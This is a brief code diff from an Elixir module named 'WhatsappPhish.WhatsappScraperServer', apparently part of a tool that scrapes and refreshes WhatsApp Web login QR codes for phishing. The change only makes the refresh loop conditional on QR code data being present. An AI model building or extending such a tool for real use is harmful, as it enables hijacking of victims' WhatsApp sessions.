@@ -26,7 +26,7 @@ defmodule WhatsappPhish.WhatsappScraperServer do
   def handle_info(:refresh_page, qr_code_data) do
     navigate_to("https://web.whatsapp.com")
     Process.send_after(self(), :update_qr_code, 2000) # In 2 seconds
-    schedule_work() # reschedule :)
+    if qr_code_data != nil, do: schedule_work() # reschedule :)
     {:noreply, qr_code_data}
   end
 
